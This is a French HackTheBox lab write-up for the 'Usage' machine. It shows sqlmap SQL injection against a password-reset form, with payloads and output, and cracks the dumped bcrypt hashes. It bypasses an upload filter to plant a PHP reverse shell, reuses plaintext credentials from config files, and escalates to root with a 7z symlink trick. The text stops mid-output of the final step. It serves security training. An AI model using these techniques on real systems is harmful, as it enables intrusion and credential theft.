---
title: HTB | Usage
description: Usage is an easy Linux machine that features a blog site vulnerable to SQL injection, which allows the administrator's hashed password to be dumped and cracked. This leads to access to the admin panel, where an outdated Laravel module is abused to upload a PHP web shell and obtain remote code execution. On the machine, plaintext credentials stored in a file allow SSH access as another user, who can run a custom binary as root. The tool makes an insecure call to 7zip, which is leveraged to read the root user's private SSH key and fully compromise the system.
slug: usage-htb
date: 2024-08-08 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Usage cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Usage</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.18</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
$ nmap 10.10.11.18 -p80,22
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Foothold

### usage.htb
On trouve une site web sur le port 80 de la machine, qui nous redirige vers : **usage.htb**. On ajoute alors le nom de domaine dans **/etc/hosts**.

### SQL Injection
Sur le site web, on remarque une page de connexion. Il y a une section "mot de passe oublié". Lorsqu'on s'y rend et qu'on écrit une email avec un `'`, on remarque que le serveur affiche un message d'erreur. L'input semble vulnérable à une possible injection SQL. On utilise donc sqlmap pour vérifier cela :
```bash
sqlmap -r request.txt --data="_token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&email=leopold" -p email --batch --level 5 --risk 3 --threads 10 --dbs
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:16:02 /2024-08-06/

[23:16:02] [INFO] parsing HTTP request from 'request.txt'
[23:16:02] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[23:16:05] [INFO] testing if the target URL content is stable
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[23:16:08] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be injectable
[23:16:10] [INFO] testing for SQL injection on POST parameter 'email'
[23:16:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:16:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[23:17:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[23:17:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[23:17:25] [INFO] POST parameter 'email' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[23:17:28] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[23:17:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[23:17:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[23:17:29] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[23:17:29] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[23:17:29] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[23:17:29] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[23:17:29] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[23:17:29] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[23:17:30] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[23:17:30] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[23:17:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[23:17:30] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[23:17:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[23:17:30] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[23:17:30] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[23:17:31] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[23:17:31] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[23:17:31] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[23:17:31] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[23:17:31] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[23:17:31] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[23:17:31] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[23:17:31] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[23:17:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[23:17:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[23:17:31] [INFO] testing 'Generic inline queries'
[23:17:31] [INFO] testing 'MySQL inline queries'
[23:17:31] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[23:17:31] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[23:17:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[23:17:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[23:17:32] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[23:17:32] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[23:17:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[23:17:32] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[23:17:33] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[23:17:33] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[23:17:33] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[23:17:33] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[23:17:33] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[23:17:33] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[23:17:34] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[23:17:34] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[23:18:34] [INFO] POST parameter 'email' appears to be 'MySQL > 5.0.12 AND time-based blind (heavy query)' injectable 
[23:18:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[23:18:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[23:18:39] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[23:18:42] [INFO] target URL appears to have 8 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[23:19:49] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[23:20:09] [INFO] target URL appears to be UNION injectable with 8 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[23:21:28] [INFO] testing 'Generic UNION query (53) - 21 to 40 columns'
[23:21:50] [INFO] testing 'Generic UNION query (53) - 41 to 60 columns'
[23:22:08] [INFO] testing 'Generic UNION query (53) - 61 to 80 columns'
[23:22:31] [INFO] testing 'Generic UNION query (53) - 81 to 100 columns'
[23:22:53] [INFO] testing 'MySQL UNION query (53) - 1 to 20 columns'
[23:23:41] [INFO] testing 'MySQL UNION query (53) - 21 to 40 columns'
[23:24:07] [INFO] testing 'MySQL UNION query (53) - 41 to 60 columns'
[23:24:24] [INFO] testing 'MySQL UNION query (53) - 61 to 80 columns'
[23:24:45] [INFO] testing 'MySQL UNION query (53) - 81 to 100 columns'
[23:25:14] [INFO] checking if the injection point on POST parameter 'email' is a false positive
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 735 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&email=leopold' AND 5458=(SELECT (CASE WHEN (5458=5458) THEN 5458 ELSE (SELECT 4624 UNION SELECT 6593) END))-- UEue

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&email=leopold' AND 1208=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- zgvX
---
[23:25:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL > 5.0.12
[23:25:41] [INFO] fetching database names
[23:25:41] [INFO] fetching number of databases
[23:25:41] [INFO] retrieved: 3
[23:25:47] [INFO] retrieving the length of query output
[23:25:47] [INFO] retrieved: 18
[23:26:30] [INFO] retrieved: information_schema             
[23:26:30] [INFO] retrieving the length of query output
[23:26:30] [INFO] retrieved: 18
[23:27:10] [INFO] retrieved: performance_schema             
[23:27:10] [INFO] retrieving the length of query output
[23:27:10] [INFO] retrieved: 10
[23:27:36] [INFO] retrieved: usage_blog             
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog

[23:27:36] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 511 times
[23:27:36] [INFO] fetched data logged to text files under '/home/leopold/.local/share/sqlmap/output/usage.htb'
[23:27:36] [WARNING] your sqlmap version is outdated

[*] ending @ 23:27:36 /2024-08-06/
```
Il est bien vulnérable ! On trouve une base de donnée mysql : `usage_blog`

### MySQL - usage_blog
A l'aide de plusieurs requête, on trouve un table `users` dans la base de données `usage_blog`. Dans cette bdd, on trouve les champs:
- email
- password

```bash
$ sqlmap -r request.txt --data="_token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&email=leopold" -p email --batch --level 5 --risk 3 --threads 10 -D usage_blog -T users --columns

        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:30:20 /2024-08-06/

[23:30:20] [INFO] parsing HTTP request from 'request.txt'
[23:30:21] [INFO] resuming back-end DBMS 'mysql' 
[23:30:21] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&email=leopold' AND 5458=(SELECT (CASE WHEN (5458=5458) THEN 5458 ELSE (SELECT 4624 UNION SELECT 6593) END))-- UEue

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&email=leopold' AND 1208=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- zgvX
---
[23:30:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL > 5.0.12
[23:30:23] [INFO] fetching columns for table 'users' in database 'usage_blog'
[23:30:23] [INFO] retrieved: 
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
8
[23:30:32] [INFO] retrieving the length of query output
[23:30:32] [INFO] retrieved: 10
[23:31:00] [INFO] retrieved: created_at             
[23:31:00] [INFO] retrieving the length of query output
[23:31:00] [INFO] retrieved: 9
[23:31:16] [INFO] retrieved: timestamp           
[23:31:16] [INFO] retrieving the length of query output
[23:31:16] [INFO] retrieved: 5
[23:31:34] [INFO] retrieved: email           <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
[23:31:34] [INFO] retrieving the length of query output
[23:31:34] [INFO] retrieved: 12
[23:32:10] [INFO] retrieved: varchar(255)             
[23:32:10] [INFO] retrieving the length of query output
[23:32:10] [INFO] retrieved: 17
[23:32:54] [INFO] retrieved: email_verified_at             
[23:32:54] [INFO] retrieving the length of query output
[23:32:54] [INFO] retrieved: 9
[23:33:21] [INFO] retrieved: timestamp           
[23:33:21] [INFO] retrieving the length of query output
[23:33:21] [INFO] retrieved: 2
[23:33:42] [INFO] retrieved: id           
[23:33:42] [INFO] retrieving the length of query output
[23:33:42] [INFO] retrieved: 15
[23:34:15] [INFO] retrieved: bigint unsigned             
[23:34:16] [INFO] retrieving the length of query output
[23:34:15] [INFO] retrieved: 4
[23:34:38] [INFO] retrieved: name           
[23:34:38] [INFO] retrieving the length of query output
[23:34:38] [INFO] retrieved: 12
[23:35:37] [INFO] retrieved: varchar(255)             
[23:35:37] [INFO] retrieving the length of query output
[23:35:37] [INFO] retrieved: 8
[23:36:10] [INFO] retrieved: password           <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
[23:36:10] [INFO] retrieving the length of query output
[23:36:10] [INFO] retrieved: 12
[23:37:11] [INFO] retrieved: varchar(255)             
[23:37:11] [INFO] retrieving the length of query output
[23:37:11] [INFO] retrieved: 14
[23:37:20] [INFO] retrieved: ______________
[23:38:06] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[23:38:06] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
[23:38:06] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[23:38:06] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[23:38:06] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[23:38:06] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[23:38:06] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[23:38:06] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[23:38:06] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[23:38:06] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[23:38:06] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] N

multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[23:39:07] [INFO] retrieved: 
[23:39:07] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[23:39:07] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[23:39:37] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 477 times
[23:39:37] [INFO] fetched data logged to text files under '/home/leopold/.local/share/sqlmap/output/usage.htb'
[23:39:37] [WARNING] your sqlmap version is outdated

[*] ending @ 23:39:37 /2024-08-06/
```

```bash
$ sqlmap -r request.txt --data="_token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&email=leopold" -p email --batch --level 5 --risk 3 --threads 10 -D usage_blog -T users -C email --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:34:07 /2024-08-06/

[23:34:07] [INFO] parsing HTTP request from 'request.txt'
[23:34:07] [INFO] resuming back-end DBMS 'mysql' 
[23:34:07] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&email=leopold' AND 5458=(SELECT (CASE WHEN (5458=5458) THEN 5458 ELSE (SELECT 4624 UNION SELECT 6593) END))-- UEue

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&email=leopold' AND 1208=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- zgvX
---
[23:34:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL > 5.0.12
[23:34:10] [INFO] fetching entries of column(s) 'email' for table 'users' in database 'usage_blog'
[23:34:10] [INFO] fetching number of column(s) 'email' entries for table 'users' in database 'usage_blog'
[23:34:10] [INFO] retrieved: 
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
5
[23:34:19] [INFO] retrieving the length of query output
[23:34:19] [INFO] retrieved: 23
[23:35:24] [INFO] retrieved: brm@brunorochamoura.com             
[23:35:24] [INFO] retrieving the length of query output
[23:35:24] [INFO] retrieved: 15
[23:36:21] [INFO] retrieved: davy@wavy.gravy             
[23:36:21] [INFO] retrieving the length of query output
[23:36:21] [INFO] retrieved: 11
[23:37:09] [INFO] retrieved: raj@raj.com             
[23:37:09] [INFO] retrieving the length of query output
[23:37:09] [INFO] retrieved: 13
[23:37:20] [INFO] retrieved: _____________
```

```bash
$ sqlmap -r request.txt --data="_token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&email=leopold" -p email --batch --level 5 --risk 3 --threads 10 -D usage_blog -T users -C password --dump

        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:34:22 /2024-08-06/

[23:34:22] [INFO] parsing HTTP request from 'request.txt'
[23:34:22] [INFO] resuming back-end DBMS 'mysql' 
[23:34:22] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&email=leopold' AND 5458=(SELECT (CASE WHEN (5458=5458) THEN 5458 ELSE (SELECT 4624 UNION SELECT 6593) END))-- UEue

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&email=leopold' AND 1208=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- zgvX
---
[23:34:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL > 5.0.12
[23:34:25] [INFO] fetching entries of column(s) 'password' for table 'users' in database 'usage_blog'
[23:34:25] [INFO] fetching number of column(s) 'password' entries for table 'users' in database 'usage_blog'
[23:34:25] [INFO] retrieved: 
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
5
[23:34:38] [INFO] retrieving the length of query output
[23:34:38] [INFO] retrieved: 60
[23:37:09] [INFO] retrieved: $2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4.             
[23:37:09] [INFO] retrieving the length of query output
[23:37:09] [INFO] retrieved: 60
[23:37:19] [INFO] retrieved: ____________________________________________________________
```

```bash
brm@brunorochamoura.com    
davy@wavy.gravy      
raj@raj.com

$2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4.
```

### Crack du mdp
On fait une attaque brute force avec john et on trouve le mot de passe suivant pour le hash découvert : `xander`

### Compte raj@raj.com
Après quelques essais, on découvre donc les credentials suivants pour se connecter au website:
> raj@raj.com : xander

En realité, ce compte utilisateur est inutile. Par contre, j'ai trouvé d'autres tables avec les users admin

### Utilisateur Admin
```bash
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+

Database: usage_blog
Table: admin_users
[8 columns]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| avatar         | varchar(255) |
| created_at     | timestamp    |
| id             | int unsigned |
| name           | varchar(255) |
| password       | varchar(60)  |
| remember_token | varchar(100) |
| updated_at     | timestamp    |
| username       | varchar(190) |
+----------------+--------------+

Database: usage_blog
Table: admin_users
[1 entry]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
+----------+--------------------------------------------------------------+
```

### Crack admin password
> admin : whatever1
```bash
john hash.txt --wordlist=~/wordlists/rockyou.txt
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X2])
Remaining 1 password hash
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:20 0% 0g/s 45.39p/s 45.39c/s 45.39C/s wesley..sandy
whatever1        (?)
1g 0:00:00:34 100% 0.02906g/s 47.42p/s 47.42c/s 47.42C/s alexis1..punkrock
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~/github/Hacking/HackTheBox/Machines/Usage (main*) » john hash.txt --wordlist=~/wordlists/rockyou.txt --show                                                       leopold@leopold-ZenBook-UX434FAC-UX434FA
Invalid options combination or duplicate option: "--show"
~/github/Hacking/HackTheBox/Machines/Usage (main*) » john hash.txt --show
?:xander
?:whatever1
```

### PHP web shell - dash user
On peut désormais se connecter sur la plateforme admin. Le lien de ce sous-domaine etait disponible sur la page d'accueil.
En se connectant, on trouve une page settings permettant de modifier l'avatar de l'utilisateur **admin**.

On peut alors upload un fichier image. On peut alors cacher un reverse shell dans un fichier **gif** ou un autre format. Au moment de l'upload, on intercepte la requete avec Burp et on modifie le nom du fichier en ".php".

Un bouton s'affiche sur la page nous permettant de download le fichier image. En recuperant le lien, on trouve donc où est situé le fichier (et où est le dossiers avec les uploads) :
http://admin.usage.htb/uploads/images/revshell.php

Il ne nous reste plus qu'a ouvrir un netcat sur notre machine personelle et d'ouvrir un shell sur la machine pour recuperer le flag utilisateur :

```bash
$ nc -lvnp 6789
Listening on 0.0.0.0 6789
Connection received on 10.10.11.18 35690
Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 23:32:32 up  1:54,  0 users,  load average: 2.39, 2.47, 2.58
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(dash) gid=1000(dash) groups=1000(dash)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
dash@usage:/$ export TERM=xterm
export TERM=xterm
dash@usage:/$ ^Z
[1]  + 21472 suspended  nc -lvnp 6789
~/github/Hacking/HackTheBox/Machines/Usage (main*) » stty raw -echo;
[1]  + 21472 continued  nc -lvnp 6789

dash@usage:/$ whoami
dash
dash@usage:/$ ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  srv  tmp  var
boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  sys  usr
dash@usage:/$ cd
dash@usage:~$ ls
user.txt
dash@usage:~$ pwd
/home/dash
dash@usage:~$ cat user.txt
5313.....4bcc
```
Pour exploiter la faille, il fallait donc au minimum selectionner un fichier avec la bonne extension image (et le bon magic byte ? J'avais mis GIF8 au début du fichier au cas où). Une fois passer cette étape, en appuyant sur submit et en modifiant la requete au vol, il n'y a plus de vérification sur le fichier envoyé donc on peut changer en php il n'y aura aucun probleme.

## dash -> xander

### mmonit service : user password ?
Le serveur utilise le service mmonit. On peut trouver un fichier .monitrc intéressant sur le serveur:
```bash
cat .monitrc 
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```
On trouve les creds:
allow admin:3nc0d3d_pa$$w0rd

### Xander user pwned
Le mdp est en fait celui de l'utilisateur xander... Dans le /home on observe bien un dossier "xander" que je n'avais pas vu dans un premier temps :
> xander : 3nc0d3d_pa$$w0rd

## xander -> root

### mysql password
Dans le fichier .env du site web :
```bash
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=usage_blog
DB_USERNAME=staff
DB_PASSWORD=s3cr3t_c0d3d_1uth
```

### Backup script as root
Voir references pour comprendre l'exploit. Mais en gros on peut faire sudo d'une commande qui fait la backup du site web. Donc des fichiers dans /var/www/html. On peut créer un lien symbolique vers le fichier du flag /root/root.txt et grâce à une faille, avec un fichier @root.txt et à l'execution de 7z, on peut recuperer l'interieur du fichier. Voir references hacktricks.
```bash
xander@usage:/var/www/html$ touch @root.txt
xander@usage:/var/www/html$ ln -s /root/root.txt root.txt
xander@usage:/var/www/html$ sudo /usr/bin/usage_management 
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7513 32-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
